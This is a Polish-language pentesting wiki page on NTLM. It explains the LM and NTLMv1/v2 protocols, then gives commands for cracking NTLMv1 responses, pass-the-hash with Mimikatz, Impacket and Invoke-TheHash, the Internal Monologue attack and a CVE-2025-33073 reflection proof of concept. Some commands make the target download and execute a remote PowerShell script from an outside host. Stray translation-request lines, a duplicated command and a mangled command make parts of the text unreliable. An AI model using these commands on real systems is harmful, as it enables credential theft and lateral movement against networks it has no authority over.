# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Podstawowe informacje

W środowiskach, w których działają **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie wiadomo, że można je łatwo złamać. Określony hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje, że LM nie jest używany i reprezentuje hash pustego ciągu.

Domyślnie podstawową metodą jest protokół uwierzytelniania **Kerberos**. NTLM (NT LAN Manager) jest używany w określonych sytuacjach: gdy Active Directory jest niedostępne, domena nie istnieje, Kerberos nie działa z powodu nieprawidłowej konfiguracji lub gdy połączenia są nawiązywane przy użyciu adresu IP zamiast prawidłowej nazwy hosta.

Obecność nagłówka **„NTLMSSP”** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.

Obsługa protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest realizowana przez określoną bibliotekę DLL znajdującą się w `%windir%\Windows\System32\msv1\_0.dll`.

**Najważniejsze informacje**:

- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że LM nie jest używany.
- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używany tylko w określonych sytuacjach.
- Pakiety uwierzytelniania NTLM można rozpoznać po nagłówku „NTLMSSP”.
- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Możesz sprawdzić i skonfigurować, który protokół będzie używany:

### GUI

Uruchom _secpol.msc_ -> Zasady lokalne -> Opcje zabezpieczeń -> Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Uruchom secpol.msc - Zasady lokalne - Opcje zabezpieczeń - Zabezpieczenia sieci: poziom uwierzytelniania LAN Manager. Dostępnych jest 6 poziomów (od 0 do 5)](<../../images/image (919).png>)

### Registry

Spowoduje to ustawienie poziomu 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Możliwe wartości:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Podstawowy schemat uwierzytelniania domeny NTLM

1. **użytkownik** wprowadza swoje **dane uwierzytelniające**
2. Maszyna kliencka **wysyła żądanie uwierzytelnienia**, przesyłając **nazwę domeny** i **nazwę użytkownika**
3. **serwer** wysyła **challenge**
4. **klient szyfruje** **challenge**, używając hasha hasła jako klucza, i wysyła go jako odpowiedź
5. **serwer wysyła** do **kontrolera domeny** **nazwę domeny, nazwę użytkownika, challenge i odpowiedź**. Jeśli **nie ma** skonfigurowanego Active Directory lub nazwa domeny jest nazwą serwera, dane uwierzytelniające są **sprawdzane lokalnie**.
6. **kontroler domeny sprawdza, czy wszystko jest poprawne**, i wysyła informacje do serwera

**serwer** i **kontroler domeny** mogą utworzyć **Secure Channel** za pośrednictwem serwera **Netlogon**, ponieważ kontroler domeny zna hasło serwera (znajduje się ono w bazie danych **NTDS.DIT**).

### Lokalny schemat uwierzytelniania NTLM

Uwierzytelnianie przebiega tak jak opisano **wcześniej, ale** **serwer** zna **hash użytkownika**, który próbuje się uwierzytelnić, znajdujący się w pliku **SAM**. Zamiast pytać kontroler domeny, **serwer sam sprawdzi**, czy użytkownik może się uwierzytelnić.

### NTLMv1 Challenge

**Długość challenge wynosi 8 bajtów**, a **odpowiedź ma długość 24 bajtów**.

**Hash NT (16 bajtów)** jest dzielony na **3 części po 7 bajtów każda** (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniana zerami**. Następnie **challenge** jest **szyfrowany osobno** za pomocą każdej części, a **wynikowe** zaszyfrowane bajty są **łączone**. Łącznie: 8B + 8B + 8B = 24 bajty.

**Problemy**:

- Brak **losowości**
- 3 części mogą być **atakowane osobno** w celu odnalezienia hasha NT
- **DES można złamać**
- Trzeci klucz zawsze składa się z **5 zer**.
- Przy **tym samym challenge** **odpowiedź będzie taka sama**. Możesz więc przekazać ofierze jako **challenge** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **wcześniej obliczonych tablic tęczowych**.

### Atak na NTLMv1

Unconstrained delegation jest mniej powszechne we współczesnych środowiskach, ale dostępna **usługa Print Spooler** może nadal zostać wykorzystana do wymuszenia uwierzytelnienia do takiego hosta.

Możesz wykorzystać niektóre posiadane już dane uwierzytelniające/sesje w AD, aby **poprosić drukarkę o uwierzytelnienie** wobec **hosta znajdującego się pod twoją kontrolą**. Następnie, używając `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić challenge uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i, jeśli została wykonana przy użyciu **NTLMv1**, będzie można ją **złamać**.\
Jeśli używasz `responder`, możesz spróbować **użyć flagi `--lm`**, aby spróbować **obniżyć wersję** **uwierzytelniania**.\
_Należy pamiętać, że w przypadku tej techniki uwierzytelnianie musi być wykonywane przy użyciu NTLMv1 (NTLMv2 jest nieprawidłowy)._

Pamiętaj, że drukarka użyje podczas uwierzytelniania konta komputera, a konta komputerów używają **długich i losowych haseł**, których **prawdopodobnie nie uda się złamać** przy użyciu typowych **słowników**. Jednak uwierzytelnianie **NTLMv1** **używa DES** ([więcej informacji tutaj](#ntlmv1-challenge)), więc korzystając z usług przeznaczonych specjalnie do łamania DES, będzie można je złamać (możesz na przykład użyć [https://crack.sh/](https://crack.sh) lub [https://ntlmv1.com/](https://ntlmv1.com)).

### Atak na NTLMv1 za pomocą hashcat

NTLMv1 można również atakować za pomocą [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), który konwertuje przechwycone komunikaty NTLMv1 do formatów odpowiednich dla Hashcat.<sup>[[1]](#references)</sup>

Polecenie
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
wygenerowałby poniższy wynik:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to put in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Uruchom hashcat (najlepiej w trybie rozproszonym za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie potrwa to kilka dni.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
W tym przypadku znamy hasło: password, więc na potrzeby demonstracji pójdziemy na skróty:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Teraz musimy użyć narzędzi hashcat-utilities, aby przekonwertować złamane klucze des na części hasha NTLM:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Wklej proszę treść ostatniej części do przetłumaczenia.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the text to combine and translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Długość challenge wynosi 8 bajtów** i wysyłane są **2 odpowiedzi**: jedna ma długość **24 bajtów**, a długość **drugiej** jest **zmienna**.

**Pierwsza odpowiedź** jest tworzona przez zaszyfrowanie za pomocą **HMAC_MD5** **stringu** złożonego z **klienta i domeny**, przy użyciu jako **klucza** **hashu MD4** z **NT hash**. Następnie **wynik** jest używany jako **klucz** do zaszyfrowania za pomocą **HMAC_MD5** wartości **challenge**. Do tego dodawany jest **client challenge o długości 8 bajtów**. Łącznie: 24 B.

**Druga odpowiedź** jest tworzona przy użyciu **kilku wartości** (nowego client challenge, **znacznika czasu**, aby zapobiegać **replay attacks**...).

Jeśli masz **PCAP zawierający pomyślną wymianę uwierzytelniającą**, wyodrębnij domenę, username, server challenge i NTLMv2 response, sformatuj przechwycone dane dla Hashcat i użyj trybu `5600`, aby spróbować odzyskać hasło. Zarchiwizowany praktyczny przewodnik zachowuje procedurę wyodrębniania pól pakietów, natomiast przykłady Hashcat definiują obecnie akceptowany format.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Gdy masz już hash of the victim**, możesz go użyć, aby się pod niego **podszyć**.\
Musisz użyć **tool**, który **wykona** **uwierzytelnianie NTLM przy użyciu** tego **hash**, albo możesz utworzyć nowy **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **uwierzytelniania NTLM** używany był ten **hash**. To właśnie robi mimikatz.

**Pamiętaj, że ataki Pass-the-Hash możesz wykonywać również przy użyciu Computer accounts.**

### **Mimikatz**

**Musi być uruchomiony jako administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Uruchamia to proces w kontekście bieżącego użytkownika lokalnego, podczas gdy LSASS kojarzy dostarczone dane uwierzytelniające z jego wychodzącym logowaniem sieciowym. Następnie możesz uzyskać dostęp do zasobów sieciowych jako dostarczony użytkownik, podobnie jak w przypadku `runas /netonly`, bez znajomości hasła w jawnym tekście.

### Pass-the-Hash z Linuksa

Możesz uzyskać wykonanie kodu na maszynach Windows, używając Pass-the-Hash z Linuksa.\
[**Zobacz praktyczne przykłady wykonania Pass-the-Hash.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Skompilowane dla Windows narzędzia Impacket

Możesz pobrać[ pliki binarne Impacket dla Windows tutaj](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (W tym przypadku musisz określić polecenie; cmd.exe i powershell.exe nie są prawidłowe do uzyskania interaktywnej powłoki)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Istnieje jeszcze kilka innych plików binarnych Impacket...

### Invoke-TheHash

Skrypty powershell możesz pobrać tutaj: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ta funkcja łączy opisane wcześniej tryby. Możesz podać **kilka hostów**, wykluczyć wybrane cele oraz wybrać _SMBExec, WMIExec, SMBClient_ lub _SMBEnum_. Jeśli wybierzesz **SMBExec** lub **WMIExec** bez parametru _**Command**_, funkcja sprawdza tylko, czy masz wystarczające uprawnienia.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Musi być uruchomione jako administrator**

To narzędzie zrobi to samo co mimikatz (zmodyfikuje pamięć LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ręczne zdalne wykonywanie poleceń w Windows przy użyciu nazwy użytkownika i hasła


{{#ref}}
../lateral-movement/
{{#endref}}

## Wyodrębnianie danych uwierzytelniających z hosta Windows

Więcej informacji znajdziesz w [**Kradzież danych uwierzytelniających Windows**](../stealing-credentials/README.md).

## Atak Internal Monologue

Internal Monologue Attack to ukryta technika wyodrębniania danych uwierzytelniających, która umożliwia atakującemu odzyskanie hashy NTLM z komputera ofiary **bez bezpośredniej interakcji z procesem LSASS**. W przeciwieństwie do Mimikatz, który odczytuje hashe bezpośrednio z pamięci i jest często blokowany przez rozwiązania endpoint security lub Credential Guard, ten atak wykorzystuje **lokalne wywołania pakietu uwierzytelniania NTLM (MSV1_0) za pośrednictwem Security Support Provider Interface (SSPI)**. Atakujący najpierw **obniża ustawienia NTLM** (np. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic), aby upewnić się, że NetNTLMv1 jest dozwolony. Następnie podszywa się pod istniejące tokeny użytkowników uzyskane z uruchomionych procesów i lokalnie wyzwala uwierzytelnianie NTLM w celu wygenerowania odpowiedzi NetNTLMv1 przy użyciu znanego challenge.<sup>[[4]](#references)</sup>

Po przechwyceniu tych odpowiedzi NetNTLMv1 atakujący może szybko odzyskać oryginalne hashe NTLM przy użyciu **wstępnie obliczonych rainbow tables**, umożliwiając dalsze ataki Pass-the-Hash w celu lateral movement. Co istotne, Internal Monologue Attack pozostaje ukryty, ponieważ nie generuje ruchu sieciowego, nie wstrzykuje kodu ani nie powoduje bezpośrednich zrzutów pamięci, przez co jest trudniejszy do wykrycia przez obrońców w porównaniu z tradycyjnymi metodami, takimi jak Mimikatz.

Jeśli NetNTLMv1 nie jest akceptowany — z powodu wymuszonych security policies — atakujący może nie uzyskać odpowiedzi NetNTLMv1.

Aby obsłużyć ten przypadek, narzędzie Internal Monologue zostało zaktualizowane: dynamicznie uzyskuje token serwera przy użyciu `AcceptSecurityContext()`, aby nadal **przechwytywać odpowiedzi NetNTLMv2**, jeśli NetNTLMv1 zawiedzie. Chociaż NetNTLMv2 jest znacznie trudniejszy do złamania, nadal umożliwia relay attacks lub offline brute-force w ograniczonych przypadkach.

PoC można znaleźć pod adresem **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay i Responder

**Przeczytaj tutaj bardziej szczegółowy przewodnik dotyczący przeprowadzania tych ataków:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsowanie challenge NTLM z przechwyconego ruchu sieciowego

**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* przez Serialized SPNs (CVE-2025-33073)

Windows zawiera kilka mechanizmów łagodzących, które mają zapobiegać atakom typu *reflection*, w których uwierzytelnianie NTLM (lub Kerberos) pochodzące z hosta jest przekazywane z powrotem do **tego samego** hosta w celu uzyskania uprawnień SYSTEM.

Microsoft przerwał większość publicznie znanych łańcuchów za pomocą MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) oraz późniejszych poprawek, jednak **CVE-2025-33073** pokazuje, że zabezpieczenia nadal można ominąć, wykorzystując sposób, w jaki **klient SMB skraca Service Principal Names (SPNs)** zawierające *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR błędu
1. Atakujący rejestruje **rekord DNS A**, którego etykieta koduje marshalled SPN — np.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Ofiara jest zmuszana do uwierzytelnienia się przy użyciu tej nazwy hosta (PetitPotam, DFSCoerce itp.).
3. Gdy klient SMB przekazuje ciąg docelowy `cifs/srv11UWhRCAAAAA…` do `lsasrv!LsapCheckMarshalledTargetInfo`, wywołanie `CredUnmarshalTargetInfo` **usuwa** serialized blob, pozostawiając **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (lub odpowiednik Kerberos) uznaje teraz cel za *localhost*, ponieważ krótka część hosta odpowiada nazwie komputera (`SRV1`).
5. W rezultacie serwer ustawia `NTLMSSP_NEGOTIATE_LOCAL_CALL` i wstrzykuje **token dostępu SYSTEM procesu LSASS** do kontekstu (w przypadku Kerberos tworzony jest podklucz sesji oznaczony jako SYSTEM).
6. Przekazanie tego uwierzytelniania za pomocą `ntlmrelayx.py` **lub** `krbrelayx.py` zapewnia pełne uprawnienia SYSTEM na tym samym hoście.<sup>[[5]](#references)</sup>

### Szybki PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Łatka i mitigacje
* Łatka KB dla **CVE-2025-33073** dodaje kontrolę w `mrxsmb.sys::SmbCeCreateSrvCall`, która blokuje każde połączenie SMB, którego cel zawiera marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Wymuś **SMB signing**, aby zapobiec reflection nawet na niezaktualizowanych hostach.
* Monitoruj rekordy DNS przypominające `*<base64>...*` i blokuj wektory coercion (PetitPotam, DFSCoerce, AuthIP...).

### Pomysły na wykrywanie
* Przechwycenia sieciowe z `NTLMSSP_NEGOTIATE_LOCAL_CALL`, w których adres IP klienta ≠ adres IP serwera.
* Kerberos AP-REQ zawierające klucz subsesji oraz principal klienta równy nazwie hosta.
* Logowania SYSTEM w zdarzeniach Windows 4624/4648, po których natychmiast następują zdalne zapisy SMB z tego samego hosta.<sup>[[5]](#references)</sup>

W przypadku wariantu local reflection z **marca 2026 r.**, który wykorzystuje **SMB arbitrary ports** i **TCP connection reuse**, aby uzyskać `NT AUTHORITY\SYSTEM`, zobacz:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – multitool NTLMv1](https://github.com/evilmog/ntlmv1-multi)
- [2] [Przykładowe hashe Hashcat – NetNTLMv2 (tryb 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – narzędzia PowerShell Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Atak Internal Monologue: pobieranie hashy NTLM bez dostępu do LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection nie żyje, niech żyje NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Łamanie hasha NTLMv2 – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
